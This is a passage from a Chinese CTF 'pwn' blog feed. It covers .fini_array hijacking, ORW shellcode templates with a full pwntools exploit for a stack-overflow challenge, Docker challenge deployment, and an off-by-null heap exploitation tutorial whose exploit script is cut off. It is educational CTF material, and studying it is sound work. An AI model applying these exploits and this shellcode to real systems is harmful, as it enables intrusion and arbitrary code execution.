class="hljs-number">0x4ba2e8</span>  __libc_IO_vtables<br><span class="hljs-number">0x4ba2e8</span> - <span class="hljs-number">0x4ba2f0</span>  __libc_atexit<br><span class="hljs-number">0x4ba300</span> - <span class="hljs-number">0x4bba78</span>  .bss<br><span class="hljs-number">0x4bba78</span> - <span class="hljs-number">0x4bbaa0</span>  __libc_freeres_ptrs<br></code></pre></td></tr></table></figure><p>其中<code>0x4b50b0 - 0x4b50c0</code>即<code>.fini_array</code>数组，其中存在两个函数指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">2</span>xg <span class="hljs-number">0x4b50b0</span><br><span class="hljs-number">0x4b50b0</span>:<span class="hljs-number">0x0000000000401b10</span><span class="hljs-number">0x0000000000401580</span><br>pwndbg&gt; x/i <span class="hljs-number">0x0000000000401b10</span><br>   <span class="hljs-number">0x401b10</span> &lt;__do_global_dtors_aux&gt;:cmp    BYTE PTR [rip+<span class="hljs-number">0xb87e9</span>],<span class="hljs-number">0x0</span><br>pwndbg&gt; x/i <span class="hljs-number">0x0000000000401580</span><br>   <span class="hljs-number">0x401580</span> &lt;fini&gt;:mov    rax,QWORD PTR [rip+<span class="hljs-number">0xb9b71</span>]<br><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><blockquote><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">array[<span class="hljs-number">0</span>]`-&gt;`__do_global_dtors_aux`<br>`array[<span class="hljs-number">1</span>]`-&gt;`fini<br></code></pre></td></tr></table></figure></blockquote><p>这两个函数都会在<code>main</code>执行完毕后执行，因此只要__覆盖这两个函数指针，即可实现控制流的劫持__</p><blockquote><p>此外，静态链接的程序也有<code>PLT</code>表和<code>GOT</code>表，也可以覆盖通过<code>GOT</code>中的函数指针实现控制流劫持</p></blockquote><p>上述<code>fini_array</code>中的两个函数指针在<code>__libc_csu_fini</code>（上文说的那位兄弟）中被执行</p><p><strong>执行的顺序是<code>array[1]-&gt;array[0]</code></strong>(后有详解)</p><h2 id="一种好玩儿的利用方式"><a href="#一种好玩儿的利用方式" class="headerlink" title="一种好玩儿的利用方式"></a>一种好玩儿的利用方式</h2><h3 id="循环大法"><a href="#循环大法" class="headerlink" title="循环大法"></a>循环大法</h3><p>一种比较好玩儿的操作：</p><ul><li>把<code>array[0]</code>的值覆盖为那位兄弟（<code>__libc_csu_fini</code>函数）的地址</li><li>把<code>array[1]</code>的值覆盖为另一个函数地址，就叫他<code>addrA</code>吧</li></ul><p>于是，<code>main</code>执行完毕后执行<code>__libc_csu_fini</code>，于是有意思的来了！</p><ul><li><code>__libc_csu_fini</code>先执行一遍<code>array[1]:addrA</code>，返回后再执行<code>array[0]:__libc_csu_fini</code></li><li><code>__libc_csu_fini</code>先执行一遍<code>array[1]:addrA</code>，返回后再执行<code>array[0]:__libc_csu_fini</code></li><li><code>__libc_csu_fini</code>先执行一遍<code>array[1]:addrA</code>，返回后再执行<code>array[0]:__libc_csu_fini</code></li><li>…</li></ul><p>看！连起来啦~ <code>main</code>-&gt;<code>__libc_csu_fini</code>-&gt;<code>addrA</code>-&gt;<code>__libc_csu_fini</code>-&gt;<code>addrA</code>-&gt; <code>......</code></p>]]></content>
    
    
    <categories>
      
      <category>函数利用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fini_array</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>newstar刷题笔记</title>
    <link href="/2024/10/25/newstar%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/10/25/newstar%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="My-GBC"><a href="#My-GBC" class="headerlink" title="My_GBC!!!!!"></a>My_GBC!!!!!</h2><p>本题收获：</p><p>学会了循环位移加密算法，需要注意的是一个对一个字节的操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror</span>(<span class="hljs-params">val , n</span>) :<br>  <span class="hljs-keyword">return</span> ((val &gt;&gt; n) | (val &lt;&lt; (<span class="hljs-number">8</span> - n))) &amp; <span class="hljs-number">0xff</span><br></code></pre></td></tr></table></figure><h2 id="不思議なscanf"><a href="#不思議なscanf" class="headerlink" title="不思議なscanf"></a>不思議なscanf</h2><p>本题收获：</p><p>scanf<code>时使用的参数</code>%d</p><p>正常输入时，输入为范围在 [−231,232−1] 内的整数。</p><p>如果输入范围在 [−263,263−1] 内的整数，则会截断高位读取，此范围是 <code>long long int</code> 的范围。</p><p>如果输入范围在 <code>long long int</code> 范围之外，则统一将参数赋值为 −1（0xFFFFFFFF）</p><p>如果输入为非数字，分为下列情况：</p><ol><li>如果输入仅有一个，则该输入无效，该值不变；</li><li>如果输入有数字前缀（如 <code>12345abcd</code>），则 <code>scanf</code> 仅会读取前面的数字，从第一个非数字开始，后面全部舍弃（<code>12345</code>）；</li><li>如果输入有多个且使用一个 <code>scanf</code> 语句（如 <code>scanf(&quot;%d, %d&quot;, &amp;a, &amp;b)</code>），输入第一个非数字后，后面的所有输入均为无效，前面的输入可以赋值；</li><li>如果输入有多个且使用多个 <code>scanf</code> 语句（含循环，即一个 <code>scanf</code> 中仅有一个输入），则输入非数字时，如果输入的不是 <code>+</code> 或 <code>-</code>，则后面紧跟的所有 <code>scanf</code> 均自动跳过，变为无效，不能输入。如果输入的 <code>+</code> 或 <code>-</code>，则会跳过当前输入，后面仍然可以进行输入。</li></ol>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>newstar_pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手搓shellcoe初级奥义</title>
    <link href="/2024/10/24/%E6%89%8B%E6%90%93shellcoe%E5%88%9D%E7%BA%A7%E5%A5%A5%E4%B9%89/"/>
    <url>/2024/10/24/%E6%89%8B%E6%90%93shellcoe%E5%88%9D%E7%BA%A7%E5%A5%A5%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>之前一直依赖pwntools工具，直接沉溺在温柔乡了，但是学到后边发现不会写shellcode真是原罪呀。所有花了一晚上时间总结了这个shellcode初级奥义，主要是ORW方面的</p><h2 id="ORW模板"><a href="#ORW模板" class="headerlink" title="ORW模板"></a>ORW模板</h2><h3 id="模板一"><a href="#模板一" class="headerlink" title="模板一"></a>模板一</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> <span class="hljs-comment">; open(&quot;flag&quot;, 0)</span><br> <span class="hljs-number">0</span>:   <span class="hljs-number">68</span> <span class="hljs-number">66</span> 6c <span class="hljs-number">61</span> <span class="hljs-number">67</span>          <span class="hljs-keyword">push</span>   <span class="hljs-number">0x67616c66</span><br> <span class="hljs-number">5</span>:   6a <span class="hljs-number">02</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x2</span><br> <span class="hljs-number">7</span>:   <span class="hljs-number">58</span>                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rax</span><br> <span class="hljs-number">8</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e7                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-symbol"> b:</span>   <span class="hljs-number">48</span> <span class="hljs-number">31</span> f6                <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsi</span><br><span class="hljs-symbol"> e:</span>   0f <span class="hljs-number">05</span>                   <span class="hljs-keyword">syscall</span> <br><br> <span class="hljs-comment">; read(fd, rsp, 0x20)</span><br><span class="hljs-number">10</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span>  ##open以后文件描述指向<span class="hljs-built_in">rax</span><br><span class="hljs-number">13</span>:   <span class="hljs-number">48</span> <span class="hljs-number">31</span> c0                <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">rax</span><br><span class="hljs-number">16</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e6                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-number">19</span>:   6a <span class="hljs-number">20</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x20</span><br><span class="hljs-number">1b</span>:   5a                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdx</span><br>1c:   0f <span class="hljs-number">05</span>                   <span class="hljs-keyword">syscall</span> <br><br> <span class="hljs-comment">; write(1, rsp, 0x20)</span><br>1e:   6a <span class="hljs-number">01</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1</span><br><span class="hljs-number">20</span>:   <span class="hljs-number">58</span>                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rax</span><br><span class="hljs-number">21</span>:   6a <span class="hljs-number">01</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1</span><br><span class="hljs-number">23</span>:   5f                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span><br><span class="hljs-number">24</span>:   <span class="hljs-number">48</span> <span class="hljs-number">89</span> e6                <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-number">27</span>:   6a <span class="hljs-number">20</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-number">0x20</span><br><span class="hljs-number">29</span>:   5a                      <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdx</span><br>2a:   0f <span class="hljs-number">05</span>                   <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h3 id="模板二-相当于cat-flag"><a href="#模板二-相当于cat-flag" class="headerlink" title="模板二(相当于cat flag)"></a>模板二(相当于cat flag)</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">/* <span class="hljs-keyword">push</span> b<span class="hljs-string">&#x27;flag\x00&#x27;</span> */<br><span class="hljs-keyword">push</span> <span class="hljs-number">0x67616c66</span><br>/* <span class="hljs-keyword">call</span> open(<span class="hljs-string">&#x27;rsp&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;O_RDONLY&#x27;</span>) */<br><span class="hljs-keyword">push</span> (<span class="hljs-number">2</span>) /* <span class="hljs-number">2</span> */<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">esi</span> /* <span class="hljs-number">0</span> */<br><span class="hljs-keyword">cdq</span> /* <span class="hljs-built_in">rdx</span>=<span class="hljs-number">0</span> */<br><span class="hljs-keyword">syscall</span><br>/* <span class="hljs-keyword">call</span> sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2147483647</span>) */<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10d</span>, <span class="hljs-number">0x7fffffff</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">push</span> (<span class="hljs-number">40</span>) /* <span class="hljs-number">0x28</span> */<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">cdq</span> /* <span class="hljs-built_in">rdx</span>=<span class="hljs-number">0</span> */<br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h2 id="例题讲解"><a href="#例题讲解" class="headerlink" title="例题讲解"></a>例题讲解</h2><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/RANDOM">附件下载</a></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410241957718.png" alt="main函数"></p><p>首先是伪随机数的绕过，进入漏洞函数</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410242000871.png" alt="漏洞函数"></p><p>只溢出了0x20个字节显然不够我们ORW，所以我们需要调用一个read读取ORW</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data     :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s        :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./RANDOM&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * 0x0000000000400948</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>seed = libc.time(<span class="hljs-number">0</span>)<br>libc.srand(seed)<br>num = libc.rand()%<span class="hljs-number">50</span><br><span class="hljs-built_in">print</span>(num)<br>p.sendlineafter(<span class="hljs-string">&#x27;please input a guess num:\n&#x27;</span> , <span class="hljs-built_in">str</span>(num))<br>bss_addr = elf.bss() + <span class="hljs-number">0x100</span><br>lss(<span class="hljs-string">&#x27;bss_addr&#x27;</span>)<br>call_read = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  /* read(0, buf, size) */</span><br><span class="hljs-string">  xor rax , rax</span><br><span class="hljs-string">  xor rdi , rdi</span><br><span class="hljs-string">  push 0x100</span><br><span class="hljs-string">  pop rdx</span><br><span class="hljs-string">  add rsi, 0x100</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">  call rsi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  /*open(fd , 0)*/</span><br><span class="hljs-string">  push 0x67616c66</span><br><span class="hljs-string">  push 2</span><br><span class="hljs-string">  pop rax</span><br><span class="hljs-string">  mov rdi , rsp</span><br><span class="hljs-string">  xor rsi , rsi</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">  /*read(fd , buf , 0x20)*/</span><br><span class="hljs-string">  mov rdi , rax</span><br><span class="hljs-string">  xor rax , rax</span><br><span class="hljs-string">  mov rsi , 0x601180</span><br><span class="hljs-string">  mov rdx , 0x20</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">  /*write(1 , buf , 0x20)*/</span><br><span class="hljs-string">  mov rax , 1</span><br><span class="hljs-string">  mov rdx , 0x20</span><br><span class="hljs-string">  mov rsi , 0x601180</span><br><span class="hljs-string">  mov rdi , 1</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>jmp_rsp = <span class="hljs-number">0x000000000040094E</span><br>payload = asm(call_read)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>payload = payload.ljust(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(jmp_rsp)<br>payload += asm(<span class="hljs-string">&quot;sub rsp , 0x30 ; jmp rsp&quot;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;your door\n&#x27;</span> , payload)<br>payload =asm(shellcode)<br><span class="hljs-built_in">print</span>(payload)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>栈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn出题初体验</title>
    <link href="/2024/10/22/pwn%E5%87%BA%E9%A2%98%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2024/10/22/pwn%E5%87%BA%E9%A2%98%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="PWN部署docker测试"><a href="#PWN部署docker测试" class="headerlink" title="PWN部署docker测试"></a>PWN部署docker测试</h2><p>这两天研究了一下题目部署docker说一下收获</p><h3 id="一、docker拉取ubuntu编译题目"><a href="#一、docker拉取ubuntu编译题目" class="headerlink" title="一、docker拉取ubuntu编译题目"></a>一、docker拉取ubuntu编译题目</h3><p>出题的时候一定要注意libc版本，尤其是堆体，但是我们也不能每个版本的ubuntu都安装一个虚拟机，所有docker是个不错的选择。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker pull ubuntu:&lt;版本号&gt; <span class="hljs-comment">#拉取拉取镜像</span><br>docker <span class="hljs-built_in">run</span> -<span class="hljs-keyword">it</span> ubuntu:&lt;版本号&gt; <span class="hljs-comment">#打开ubuntu系统交互</span><br>apt update <span class="hljs-comment">#更新数据</span><br>apt install gcc -y <span class="hljs-comment">#下载编译器</span><br></code></pre></td></tr></table></figure><p>然后我们就可以把c文件传入docker中进行编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">docker cp &lt;文件目录&gt; &lt;容器ID&gt;:&lt;文件路径&gt; <span class="hljs-comment">#向容器中传送文件</span><br>docker cp &lt;容器ID&gt;:&lt;文件路径&gt; &lt;文件目录&gt; <span class="hljs-comment">#从docker中拉取文件</span><br></code></pre></td></tr></table></figure><h3 id="二、部署到docker"><a href="#二、部署到docker" class="headerlink" title="二、部署到docker"></a>二、部署到docker</h3><p>在仓库拉取一下<a href="https://gitee.com/tky5216/ctf_xinetd.git">项目</a></p><p>然后按照md文件说明操作就像</p>]]></content>
    
    
    <categories>
      
      <category>杂记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN出题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>off-by-null利用手法</title>
    <link href="/2024/10/22/off-by-null%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/"/>
    <url>/2024/10/22/off-by-null%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="off-by-null利用手法"><a href="#off-by-null利用手法" class="headerlink" title="off-by-null利用手法"></a>off-by-null利用手法</h1><p>关于堆块的构造一般情况下使用两头大中间小的构造，因为这样可以堆块重叠去fastbin攻击，当然特殊情况特殊对待。</p><p>下面讲解一下构造过程</p><p>申请五个堆块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x100</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x30</span> , <span class="hljs-string">b&#x27;ccc&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span> , <span class="hljs-string">b&#x27;dddd&#x27;</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0xf0</span> , <span class="hljs-string">b&#x27;eeee&#x27;</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">b&#x27;ffff&#x27;</span>) <span class="hljs-comment">#4</span><br></code></pre></td></tr></table></figure><p><strong>其中需要注意的是第四个和第五个，第四个是应为创建后为0x101然后利用off-by-null可以变成0x100大小不变只是pre_size变了，第五个是防止和Top_chunk合并</strong></p><p>然后我们通过chunk2利用off-by-null漏洞来伪造chunk3前边的chunk已经全部被释放</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221952406.png" alt="图1"></p><p>然后我们先释放chunk0然后当释放chunk3的时候就会触发unlink，导致chunk3和它前边的chunk都合并（因为我们已经伪造了前边的chunk为一个，且已经释放）</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221952050.png" alt="图2"></p><p>我看可以看到chunk1和chunk2已经被包括进去，这就造成了堆块重叠</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/babyheap">例题下载</a></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>打开ida为经典堆题</p><p>查看add函数，正常申请堆块</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221913656.png" alt="add函数"></p><p>edit函数也没有存在堆溢出</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221914138.png" alt="edit函数"></p><p>show函数正常打印chunk的内容</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221915839.png" alt="show函数"></p><p>delete函数也不存在UAF</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221916816.png" alt="delete函数"></p><p>但是在read_input中发现漏洞，存在off-by-null漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410221917668.png" alt="read_input"></p><p>解题思路为</p><ol><li>利用off-by-null漏洞制造堆块重叠</li><li>然后利用堆块重叠修改fastbin的fd指针进行fastbin attack</li><li>打malloc_hook用realloc调节rsp的值，以满足one_gadget的条件</li></ol><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>ls      = <span class="hljs-keyword">lambda</span> data               :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s                  :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;babyheap&#x27;</span><br>url = <span class="hljs-string">&#x27;192.168.180.130:3389&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span 